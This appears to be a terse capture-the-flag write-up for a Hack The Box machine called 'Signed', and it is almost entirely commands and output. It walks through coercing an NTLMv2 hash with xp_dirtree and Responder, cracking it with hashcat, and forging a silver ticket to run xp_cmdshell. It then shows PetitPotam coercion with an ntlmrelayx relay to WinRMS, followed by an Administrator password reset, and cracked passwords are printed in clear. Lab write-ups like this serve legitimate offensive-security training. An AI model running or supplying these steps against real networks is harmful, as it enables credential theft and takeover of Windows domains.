```
kali@kali ~> nmap -sC -sV 10.129.92.92
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 20:46 UTC
Nmap scan report for 10.129.92.92
Host is up (0.062s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.92.92:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-10-11T20:47:43+00:00; +1s from scanner time.
| ms-sql-info: 
|   10.129.92.92:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-11T20:45:22
|_Not valid after:  2055-10-11T20:45:22

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.52 seconds

```

we only have mssql and we can go in with mssqlclient.py

```
SQL (scott  guest@master)> enum_logins
name    type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa      SQL_LOGIN             0          1               0             0            0              0           0           0           0   

scott   SQL_LOGIN             0          0               0             0            0              0           0           0           0   
```



```
SQL (scott  guest@master)> xp_dirtree \\10.10.14.176\a                                                                
subdirectory   depth   file                                                                                                                                                                                                                 
------------   -----   ----                                                                                           
```


```
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.176]
    Responder IPv6             [dead:beef:2::10ae]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-EXEREF6UH69]
    Responder Domain Name      [0S3P.LOCAL]
    Responder DCE-RPC Port     [49192]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.92.92
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:34357412cc561e72:EA0043A9BDFE96307A3E7E41513281E0:010100000000000080FE30DCF13ADC011B4E8ABF35FC2DB10000000002000800300053003300500001001E00570049004E002D004500580045005200450046003600550048003600390004003400570049004E002D00450058004500520045004600360055004800360039002E0030005300330050002E004C004F00430041004C000300140030005300330050002E004C004F00430041004C000500140030005300330050002E004C004F00430041004C000700080080FE30DCF13ADC0106000400020000000800300030000000000000000000000000300000594A482E62C97AEF26DDFE1307150810AB21B6091BB270E35CC234858E3B23150A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100370036000000000000000000
```





```
kali@kali ~/b/htb [1]> hashcat -m 5600 -a 0 mssql.txt /usr/share/wordlists/rockyou.txt                                                                                                                                      21:08:50 [9/281]
hashcat (v6.2.6) starting           
                                                           
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400F, 2913/5890 MB (1024 MB allocatable), 4MCU
                                                           
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
                                                           
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                                                                                         
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MSSQLSVC::SIGNED:34357412cc561e72:ea0043a9bdfe96307a3e7e41513281e0:010100000000000080fe30dcf13adc011b4e8abf35fc2db10000000002000800300053003300500001001e00570049004e002d004500580045005200450046003600550048003600390004003400570049004e002
d00450058004500520045004600360055004800360039002e0030005300330050002e004c004f00430041004c000300140030005300330050002e004c004f00430041004c000500140030005300330050002e004c004f00430041004c000700080080fe30dcf13adc010600040002000000080030003
0000000000000000000000000300000594a482e62c97aef26ddfe1307150810ab21b6091bb270e35cc234858e3b23150a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370036000000000000000000:purPLE9795!@


```


```
kali@kali ~/b/htb> nxc mssql 10.129.92.92 -u 'mssqlsvc' -p 'purPLE9795!@' 
MSSQL       10.129.92.92    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.92.92    1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 

```

Links is default

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
DC01            NULL                        1   NULL           
```

Impersonation is defaullt

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor                        
----------   --------   ---------------   ----------   --------   ----------------------------   
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser   
```

Now when we enumerate the logins

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   

##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

SIGNED\IT  <---------               WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   

SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
```

So what we can do here is impersonate the users using a silver ticket, what we need for that thought is the domain sid and the nt hash of our current user 

```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID();
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'   
```


```powershell
# Input: binary SID as a hex string (can be b'...' or plain hex string)
$hex = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"

# Strip b'' or b"" if present
$hex = $hex -replace "^b['""]|['""]$", ""

# Convert hex string to byte array
$bytes = for ($i=0; $i -lt $hex.Length; $i+=2) { [Convert]::ToByte($hex.Substring($i,2),16) }

# Parse SID
$revision = $bytes[0]
$subAuthCount = $bytes[1]

# Identifier authority is 6 bytes, big-endian
$identAuth = ($bytes[2..7] | ForEach-Object { $_.ToString("X2") }) -join ""
$identAuthInt = [Convert]::ToInt64($identAuth, 16)

$sid = "S-$revision-$identAuthInt"

# SubAuthorities are 4 bytes each, little-endian
for ($i=0; $i -lt $subAuthCount; $i++) {
    $start = 8 + ($i * 4)
    $subAuth = [BitConverter]::ToUInt32($bytes, $start)
    $sid += "-$subAuth"
}

Write-Output $sid
```

```
PS C:\Users\USER\Downloads> .\FUCK.ps1
S-1-5-21-4088429403-1159899800-2753317549-1103
```


```
kali@kali ~> pypykatz crypto -h
usage: pypykatz crypto [-h] {nt,lm,dcc,dcc2,gppass,ofscan,vnc} ...

positional arguments:
  {nt,lm,dcc,dcc2,gppass,ofscan,vnc}
    nt                  Generates NT hash of the password
    lm                  Generates LM hash of the password
    dcc                 Generates DCC v1 (domain cached credentials version 1) hash of the password
    dcc2                Generates DCC v2 (domain cached credentials version 2) hash of the password
    gppass              Decrypt GP passwords
    ofscan              Decrypt TrendMicro OfficeScan config file
    vnc                 Decrypt VNC password

options:
  -h, --help            show this help message and exit
kali@kali ~> pypykatz crypto nt purPLE9795!@
ef699384c3285c54128a3ee1ddb1a0cc

```

```
ticketer.py -spn 'MSSQL/DC01.SIGNED.HTB' -domain 'signed.htb' -domain-sid 'S-1-5-21-4086716539-1166372504-2751217197' -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' Administrator
```


```python
kali@kali ~> ticketer.py -spn 'MSSQLSvc/DC01.SIGNED.HTB' -domain 'signed.htb' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549-1103' -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' 
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

usage: ticketer.py [-h] [-spn SPN] [-request] -domain DOMAIN -domain-sid DOMAIN_SID [-aesKey hex key] [-nthash NTHASH] [-keytab KEYTAB] [-groups GROUPS] [-user-id USER_ID] [-extra-sid EXTRA_SID] [-extra-pac] [-old-pac]
                   [-duration DURATION] [-ts] [-debug] [-user USER] [-password PASSWORD] [-hashes LMHASH:NTHASH] [-dc-ip ip address] [-impersonate IMPERSONATE]
                   target

Creates a Kerberos golden/silver tickets based on user options
[...SNIP...]
  -groups GROUPS        comma separated list of groups user will belong to (default = 513, 512, 520, 518, 519)  <-------------

```





```python
kali@kali ~> impacket-ticketer -domain signed.htb -spn mssqlsvc/dc01.signed.htb -user-id 1103 -groups 512,1105 -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache

```



```
kali@kali ~> mssqlclient.py 'mssqlsvc'@DC01.SIGNED.HTB -k -no-pass
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell type c:\users\mssqlsvc\desktop\user.txt
output                             
--------------------------------   
8e3b1d11203932e1b370c846fb6f1506   

NULL                               
```


For 

# ROOT


```
nxc smb signed.htb -u mssqlsvc -p 'purPLE9795!@' -M ntlm_reflection
```


```
kali@kali ~> proxychains -q nxc smb 10.129.203.5 -u mssqlsvc -p 'purPLE9795!@' -M ntlm_reflection
SMB         10.129.203.5    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.203.5    445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
NTLM_REF... 10.129.203.5    445    DC01             VULNERABLE (can relay SMB to other protocols except SMB on 10.129.203.5)
```


```
kali@kali ~/t/krbrelayx (master) [2]> proxychains -q python dnstool.py   \
                                            -u 'signed.htb\mssqlsvc' \
                                            -p 'purPLE9795!@' \
                                            -a 'add' \
                                            -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
                                            -d '10.10.14.168' \
                                            -dns-ip 10.129.203.5 \
                                            --tcp dc01.signed.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully

```


```
kali@kali ~/t/krbrelayx (master) [SIGINT]> dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @DC01.SIGNED.HTB

; <<>> DiG 9.20.11-4-Debian <<>> localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @DC01.SIGNED.HTB
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64045
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. IN A

;; ANSWER SECTION:
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. 180 IN A 10.10.15.2

;; Query time: 59 msec
;; SERVER: 10.129.242.173#53(DC01.SIGNED.HTB) (UDP)
;; WHEN: Wed Oct 22 13:59:13 UTC 2025
;; MSG SIZE  rcvd: 109

```


Now we setup the petitpotam and the relay!!

```
kali@kali ~/t/PetitPotam (main)> proxychains -q python PetitPotam.py -d 'signed.htb' -u 'mssqlsvc' -p 'purPLE9795!@' localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA DC01.SIGNED.HTB
/home/kali/tools/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:DC01.SIGNED.HTB[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

The relay command

```
kali@kali ~/t/impacket (master)> proxychains -q ntlmrelayx.py -t 'winrms://dc01.signed.htb' -smb2support  --keep-relaying
Impacket v0.13.0.dev0+20251021.181244.39b9d898 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://dc01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://dc01.signed.htb SUCCEED [1]
[*] winrms:///@dc01.signed.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] All targets processed!
[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://dc01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://dc01.signed.htb SUCCEED [2]
[*] winrms:///@dc01.signed.htb [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001

```



Now lets connect to that winrm port


```
kali@kali ~/b/scrap> nc 127.0.0.1 11000
Type help for list of commands

# net user Administrator P@ssw0rd123!
The command completed successfully.
```


Now we can login and get the root flag


```
kali@kali ~> proxychains -q impacket-getTGT 'SIGNED.HTB'/'Administrator':'P@ssw0rd123!'@'DC01.SIGNED.HTB'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
kali@kali ~> pypykatz crypto nt P@ssw0rd123!
7dfa0531d73101ca080c7379a9bff1c7

kali@kali ~> proxychains -q impacket-getTGT SIGNED.HTB/Administrator@DC01.SIGNED.HTB -hashes ':7dfa0531d73101ca080c7379a9bff1c7'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator@DC01.SIGNED.HTB.ccache
```




